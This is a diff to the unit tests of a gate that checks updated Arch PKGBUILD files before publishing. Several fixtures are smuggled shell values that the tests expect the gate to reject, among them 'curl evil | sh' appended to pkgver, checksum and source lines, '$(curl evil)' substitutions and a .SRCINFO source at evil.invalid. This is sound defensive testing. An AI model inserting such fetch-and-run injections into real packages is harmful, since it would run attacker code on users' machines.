@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Tests for the PKGBUILD/.SRCINFO artifact gate."""
+"""Tests for the sealed PKGBUILD gate."""
 
 from __future__ import annotations
 
@@ -10,136 +10,145 @@ from pathlib import Path
 
 import publish_artifact as gate
 
-SRCINFO = """pkgbase = maple-mono-nf-cn
-	pkgdesc = font
-	pkgver = 7.9
-	pkgrel = 1
+H1 = "ab" * 32
+H2 = "cd" * 32
+H3 = "ef" * 32
 
-pkgname = maple-mono-nf-cn
-"""
-
-BASELINE = """pkgname=maple-mono-nf-cn
+BASELINE = f"""pkgname=maple-mono-nf-cn
 pkgver=7.9
 pkgrel=1
 source=("https://example.invalid/MapleMono.zip")
-sha256sums=('aaa'
-            'bbb')
+sha256sums=('{H1}'
+            '{H2}')
 """
 
 
-def write_pair(directory: Path, pkgbuild: str, srcinfo: str = SRCINFO) -> None:
+def write_pkgbuild(directory: Path, pkgbuild: str) -> None:
     directory.mkdir(parents=True, exist_ok=True)
     (directory / "PKGBUILD").write_text(pkgbuild, encoding="utf-8")
-    (directory / ".SRCINFO").write_text(srcinfo, encoding="utf-8")
 
 
 class StageTest(unittest.TestCase):
+    def stage(self, root: Path, pkgbuild: str, baseline: str = BASELINE, package: str = "maple-mono-nf-cn") -> Path:
+        base = root / "baseline"
+        base.write_text(baseline, encoding="utf-8")
+        out = root / "out"
+        write_pkgbuild(out, pkgbuild)
+        stage = root / "stage"
+        gate.stage(package, base, out, stage)
+        return stage
+
     def test_checksum_edit_is_accepted(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
-            root = Path(tmp)
-            baseline = root / "baseline"
-            baseline.write_text(BASELINE, encoding="utf-8")
-            out = root / "out"
-            updated = BASELINE.replace("'aaa'", "'ccc'").replace("'bbb'", "'ddd'")
-            write_pair(out, updated)
-            stage = root / "stage"
-            gate.stage("maple-mono-nf-cn", baseline, out, stage)
+            updated = BASELINE.replace(H1, H3)
+            stage = self.stage(Path(tmp), updated)
             manifest = (stage / "MANIFEST").read_text(encoding="utf-8")
             self.assertIn("status=publish", manifest)
+            self.assertNotIn("srcinfo=", manifest)
             digest = hashlib.sha256(updated.encode()).hexdigest()
             self.assertIn(f"pkgbuild={digest}", manifest)
-            self.assertEqual(sorted(path.name for path in stage.iterdir()), [".SRCINFO", "MANIFEST", "PKGBUILD"])
+            self.assertEqual(sorted(path.name for path in stage.iterdir()), ["MANIFEST", "PKGBUILD"])
+
+    def test_pkgver_and_pkgrel_edits_are_accepted(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            updated = BASELINE.replace("pkgver=7.9", "pkgver=7.10").replace("pkgrel=1", "pkgrel=2")
+            self.stage(Path(tmp), updated)
 
     def test_source_url_edit_is_rejected(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
-            root = Path(tmp)
-            baseline = root / "baseline"
-            baseline.write_text(BASELINE, encoding="utf-8")
-            out = root / "out"
-            write_pair(out, BASELINE.replace("example.invalid", "evil.invalid"))
+            updated = BASELINE.replace("example.invalid", "evil.invalid")
             with self.assertRaises(SystemExit) as caught:
-                gate.stage("maple-mono-nf-cn", baseline, out, root / "stage")
-            self.assertIn("beyond checksums", str(caught.exception))
+                self.stage(Path(tmp), updated)
+            self.assertIn("beyond pkgver", str(caught.exception))
 
-    def test_pkgver_edit_is_rejected_for_release_packages(self) -> None:
+    def test_unsafe_pkgver_is_rejected(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            updated = BASELINE.replace("pkgver=7.9", "pkgver=7.9; curl evil | sh")
+            with self.assertRaises(SystemExit) as caught:
+                self.stage(Path(tmp), updated)
+            self.assertIn("unsafe pkgver", str(caught.exception))
+
+    def test_smuggled_checksum_lines_are_rejected(self) -> None:
+        variants = {
+            "semicolon": f"sha256sums=('{H1}'); curl evil | sh",
+            "and": f"sha256sums=('{H1}') && curl evil | sh",
+            "command": "sha256sums=('$(curl evil)')",
+            "backtick": "sha256sums=('`curl evil`')",
+            "comment": f"sha256sums=('{H1}') # keep",
+            "uppercase": "sha256sums=('AB" + ("ab" * 31) + "')",
+            "short": "sha256sums=('abcd')",
+            "injected": f"sha256sums=('{H1}'\ncurl evil | sh\n'{H2}')",
+            "skip": "sha256sums=('SKIP')",
+        }
+        for name, sums in variants.items():
+            with self.subTest(name=name):
+                updated = "pkgname=maple-mono-nf-cn\npkgver=7.9\npkgrel=1\n" + sums + "\n"
+                baseline = (
+                    "pkgname=maple-mono-nf-cn\npkgver=7.9\npkgrel=1\n"
+                    f"sha256sums=('{H1}')\n"
+                )
+                with tempfile.TemporaryDirectory() as tmp:
+                    with self.assertRaises(SystemExit):
+                        self.stage(Path(tmp), updated, baseline)
+
+    def test_arch_specific_sums_and_multiline_are_accepted(self) -> None:
+        baseline = (
+            "pkgname=memprocfs\npkgver=5.19.0\npkgrel=20261014\n"
+            f"sha256sums_x86_64=('{H1}')\n"
+            f"sha256sums_aarch64=('{H2}')\n"
+        )
+        updated = baseline.replace(H1, H3)
+        with tempfile.TemporaryDirectory() as tmp:
+            self.stage(Path(tmp), updated, baseline, "memprocfs")
+
+    def test_git_skip_and_abbrev_growth(self) -> None:
+        baseline = (
+            "pkgname=cuda-api-wrappers-git\n"
+            "pkgver=0.8.2.r0.gc2f2a2b\n"
+            "pkgrel=1\n"
+            "sha256sums=('SKIP')\n"
+        )
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
-            baseline = root / "baseline"
-            baseline.write_text(BASELINE, encoding="utf-8")
-            out = root / "out"
-            write_pair(out, BASELINE.replace("pkgver=7.9", "pkgver=9.9"))
-            with self.assertRaises(SystemExit) as caught:
-                gate.stage("maple-mono-nf-cn", baseline, out, root / "stage")
-            self.assertIn("pkgver changed", str(caught.exception))
-
-    def test_git_abbrev_growth_is_accepted_and_a_new_commit_is_not(self) -> None:
+            self.stage(
+                root,
+                baseline.replace("gc2f2a2b", "gc2f2a2b1"),
+                baseline,
+                "cuda-api-wrappers-git",
+            )
         with tempfile.TemporaryDirectory() as tmp:
-            root = Path(tmp)
-            baseline_text = (
-                "pkgname=cuda-api-wrappers-git\n"
-                "pkgver=0.8.2.r0.gc2f2a2b\n"
-                "pkgrel=1\n"
-                "sha256sums=('SKIP')\n"
-            )
-            srcinfo = SRCINFO.replace("maple-mono-nf-cn", "cuda-api-wrappers-git").replace(
-                "pkgver = 7.9", "pkgver = 0.8.2.r0.gc2f2a2b1"
-            )
-            baseline = root / "baseline"
-            baseline.write_text(baseline_text, encoding="utf-8")
-            out = root / "out"
-            write_pair(out, baseline_text.replace("gc2f2a2b", "gc2f2a2b1"), srcinfo)
-            gate.stage("cuda-api-wrappers-git", baseline, out, root / "stage")
-            bad = root / "bad"
-            bad_src = srcinfo.replace("gc2f2a2b1", "deadbeef")
-            write_pair(bad, baseline_text.replace("gc2f2a2b", "deadbeef"), bad_src)
             with self.assertRaises(SystemExit) as caught:
-                gate.stage("cuda-api-wrappers-git", baseline, bad, root / "stage2")
+                self.stage(
+                    Path(tmp),
+                    baseline.replace("gc2f2a2b", "deadbeef"),
+                    baseline,
+                    "cuda-api-wrappers-git",
+                )
             self.assertIn("not the same commit", str(caught.exception))
 
-    def test_skip_checksum_is_rejected_for_non_git(self) -> None:
+    def test_extra_file_and_symlink_are_rejected(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
-            baseline = root / "baseline"
-            baseline.write_text(BASELINE, encoding="utf-8")
+            base = root / "baseline"
+            base.write_text(BASELINE, encoding="utf-8")
             out = root / "out"
-            write_pair(out, BASELINE.replace("'aaa'", "'SKIP'"))
-            with self.assertRaises(SystemExit) as caught:
-                gate.stage("maple-mono-nf-cn", baseline, out, root / "stage")
-            self.assertIn("SKIP", str(caught.exception))
-
-    def test_symlink_and_extra_file_are_rejected(self) -> None:
-        with tempfile.TemporaryDirectory() as tmp:
-            root = Path(tmp)
-            baseline = root / "baseline"
-            baseline.write_text(BASELINE, encoding="utf-8")
-            out = root / "out"
-            write_pair(out, BASELINE)
+            write_pkgbuild(out, BASELINE)
             (out / "publish.sh").write_text("echo pwned\n", encoding="utf-8")
             with self.assertRaises(SystemExit):
-                gate.stage("maple-mono-nf-cn", baseline, out, root / "stage")
+                gate.stage("maple-mono-nf-cn", base, out, root / "stage")
             linked = root / "linked"
             linked.mkdir()
-            (linked / "PKGBUILD").symlink_to(baseline)
-            (linked / ".SRCINFO").write_text(SRCINFO, encoding="utf-8")
+            (linked / "PKGBUILD").symlink_to(base)
             with self.assertRaises(SystemExit):
-                gate.stage("maple-mono-nf-cn", baseline, linked, root / "stage2")
+                gate.stage("maple-mono-nf-cn", base, linked, root / "stage2")
 
 
 class ImportTest(unittest.TestCase):
-    def stage_of(self, root: Path, pkgbuild: str, srcinfo: str = SRCINFO) -> Path:
-        baseline = root / "baseline"
-        baseline.write_text(BASELINE, encoding="utf-8")
-        out = root / "out"
-        write_pair(out, pkgbuild, srcinfo)
-        stage = root / "stage"
-        gate.stage("maple-mono-nf-cn", baseline, out, stage)
-        return stage
-
-    def test_import_replaces_only_the_two_files(self) -> None:
+    def test_import_replaces_pkgbuild_only(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
-            updated = BASELINE.replace("'aaa'", "'ccc'")
-            stage = self.stage_of(root, updated)
+            updated = BASELINE.replace(H1, H3)
+            stage = StageTest().stage(root, updated)
             dest = root / "maple-mono-nf-cn"
             dest.mkdir()
             (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
@@ -147,14 +156,13 @@ class ImportTest(unittest.TestCase):
             (dest / "extra.txt").write_text("keep\n", encoding="utf-8")
             gate.import_artifact("maple-mono-nf-cn", stage, dest)
             self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), updated)
-            self.assertEqual((dest / ".SRCINFO").read_text(encoding="utf-8"), SRCINFO)
+            self.assertEqual((dest / ".SRCINFO").read_text(encoding="utf-8"), "old\n")
             self.assertEqual((dest / "extra.txt").read_text(encoding="utf-8"), "keep\n")
-            self.assertFalse((dest / "MANIFEST").exists())
 
     def test_import_refuses_a_downgrade(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
-            stage = self.stage_of(root, BASELINE)
+            stage = StageTest().stage(root, BASELINE)
             dest = root / "maple-mono-nf-cn"
             dest.mkdir()
             current = BASELINE.replace("pkgver=7.9", "pkgver=8.0")
@@ -164,35 +172,80 @@ class ImportTest(unittest.TestCase):
             self.assertIn("older", str(caught.exception))
             self.assertEqual((dest / "PKGBUILD").read_text(encoding="utf-8"), current)
 
-    def test_import_allows_the_same_git_commit_with_a_shorter_hash(self) -> None:
+    def test_import_allows_a_strict_source_url_change(self) -> None:
+        old = (
+            "pkgname=memprocfs\npkgver=5.19.0\npkgrel=20261014\n"
+            'source_x86_64=("https://example.invalid/old.tar.gz")\n'
+            f"sha256sums_x86_64=('{H1}')\n"
+        )
+        new = old.replace("old.tar.gz", "new.tar.gz").replace(H1, H3).replace("pkgrel=20261014", "pkgrel=20261101")
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
-            current = (
-                "pkgname=cuda-api-wrappers-git\n"
-                "pkgver=0.8.2.r0.gc2f2a2b1\n"
-                "pkgrel=1\n"
-                "sha256sums=('SKIP')\n"
-            )
-            updated = current.replace("gc2f2a2b1", "gc2f2a2b")
-            srcinfo = (
-                "pkgbase = cuda-api-wrappers-git\n"
-                "\tpkgver = 0.8.2.r0.gc2f2a2b\n"
-                "\tpkgrel = 1\n"
-                "\n"
-                "pkgname = cuda-api-wrappers-git\n"
-            )
             artifact = root / "artifact"
-            write_pair(artifact, updated, srcinfo)
-            files = {
-                "PKGBUILD": (artifact / "PKGBUILD").read_bytes(),
-                ".SRCINFO": (artifact / ".SRCINFO").read_bytes(),
-            }
-            gate.write_manifest(artifact, "publish", files)
+            write_pkgbuild(artifact, new)
+            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
+            dest = root / "memprocfs"
+            dest.mkdir()
+            (dest / "PKGBUILD").write_text(old, encoding="utf-8")
+            gate.import_artifact("memprocfs", artifact, dest)
+            self.assertIn("new.tar.gz", (dest / "PKGBUILD").read_text(encoding="utf-8"))
+
+    def test_import_rejects_shell_in_source_and_srcinfo_payload(self) -> None:
+        old = (
+            "pkgname=memprocfs\npkgver=5.19.0\npkgrel=20261014\n"
+            'source_x86_64=("https://example.invalid/old.tar.gz")\n'
+            f"sha256sums_x86_64=('{H1}')\n"
+        )
+        new = old.replace(
+            'source_x86_64=("https://example.invalid/old.tar.gz")',
+            'source_x86_64=("https://example.invalid/old.tar.gz"); curl evil | sh',
+        )
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            artifact = root / "artifact"
+            write_pkgbuild(artifact, new)
+            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
+            dest = root / "memprocfs"
+            dest.mkdir()
+            (dest / "PKGBUILD").write_text(old, encoding="utf-8")
+            with self.assertRaises(SystemExit):
+                gate.import_artifact("memprocfs", artifact, dest)
+
+        smuggled_srcinfo = (
+            "pkgbase = maple-mono-nf-cn\n"
+            "\tsource = https://evil.invalid/payload\n"
+        )
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            artifact = root / "artifact"
+            write_pkgbuild(artifact, BASELINE)
+            (artifact / ".SRCINFO").write_text(smuggled_srcinfo, encoding="utf-8")
+            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
+            dest = root / "maple-mono-nf-cn"
+            dest.mkdir()
+            (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
+            with self.assertRaises(SystemExit) as caught:
+                gate.import_artifact("maple-mono-nf-cn", artifact, dest)
+            self.assertIn("unexpected artifact files", str(caught.exception))
+
+    def test_import_allows_the_same_git_commit_with_a_shorter_hash(self) -> None:
+        current = (
+            "pkgname=cuda-api-wrappers-git\n"
+            "pkgver=0.8.2.r0.gc2f2a2b1\n"
+            "pkgrel=1\n"
+            "sha256sums=('SKIP')\n"
+        )
+        updated = current.replace("gc2f2a2b1", "gc2f2a2b")
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            artifact = root / "artifact"
+            write_pkgbuild(artifact, updated)
+            gate.write_manifest(artifact, "publish", {"PKGBUILD": (artifact / "PKGBUILD").read_bytes()})
             dest = root / "cuda-api-wrappers-git"
             dest.mkdir()
             (dest / "PKGBUILD").write_text(current, encoding="utf-8")
             gate.import_artifact("cuda-api-wrappers-git", artifact, dest)
-            self.assertIn("gc2f2a2b\n", (dest / "PKGBUILD").read_text(encoding="utf-8"))
+            self.assertIn("pkgver=0.8.2.r0.gc2f2a2b\n", (dest / "PKGBUILD").read_text(encoding="utf-8"))
 
     def test_skip_marker_does_not_touch_the_checkout(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
@@ -208,23 +261,21 @@ class ImportTest(unittest.TestCase):
     def test_nested_download_directory_is_accepted(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
-            stage = self.stage_of(root, BASELINE)
+            stage = StageTest().stage(root, BASELINE)
             nested = root / "download"
             nested.mkdir()
-            moved = nested / "aur-stage"
-            stage.rename(moved)
+            stage.rename(nested / "aur-stage")
             dest = root / "maple-mono-nf-cn"
             dest.mkdir()
             (dest / "PKGBUILD").write_text(BASELINE, encoding="utf-8")
             gate.import_artifact("maple-mono-nf-cn", nested, dest)
-            self.assertTrue((dest / ".SRCINFO").is_file())
+            self.assertFalse((dest / ".SRCINFO").exists())
 
     def test_manifest_hash_mismatch_is_rejected(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
-            stage = self.stage_of(root, BASELINE)
+            stage = StageTest().stage(root, BASELINE)
             manifest = stage / "MANIFEST"
-            manifest.write_text(manifest.read_text(encoding="utf-8").replace("status=publish", "status=publish"), encoding="utf-8")
             text = manifest.read_text(encoding="utf-8")
             text = text.replace(text.split("pkgbuild=", 1)[1][:8], "00000000")
             manifest.write_text(text, encoding="utf-8")
